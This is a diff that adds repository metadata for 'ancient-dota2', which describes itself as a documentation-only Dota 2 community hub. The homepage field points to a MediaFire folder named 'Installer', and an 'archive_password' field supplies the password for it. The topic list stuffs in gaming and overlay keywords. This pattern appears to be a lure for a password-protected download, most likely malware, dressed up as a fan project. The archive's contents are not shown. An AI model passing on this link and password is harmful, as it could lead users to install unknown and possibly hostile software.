@@ -1,0 +1,30 @@
+{
+  "name": "ancient-dota2",
+  "description": "Ancient - documentation-only Dota 2 community hub with setup notes, configuration hygiene, interface concepts and one download folder (2026).",
+  "homepage": "https://www.mediafire.com/folder/xpuwhpaw2jpbi/Installer",
+  "archive_password": "5139237619",
+  "private": false,
+  "has_discussions": true,
+  "has_issues": true,
+  "topics": [
+    "dota2",
+    "dota",
+    "dota-2",
+    "community-hub",
+    "documentation",
+    "overlay",
+    "configuration",
+    "windows",
+    "x64",
+    "source2",
+    "gaming",
+    "setup-guide",
+    "troubleshooting",
+    "ui-concept",
+    "assets",
+    "mit-license",
+    "fan-project",
+    "ancient-dota2",
+    "ancient"
+  ]
+}
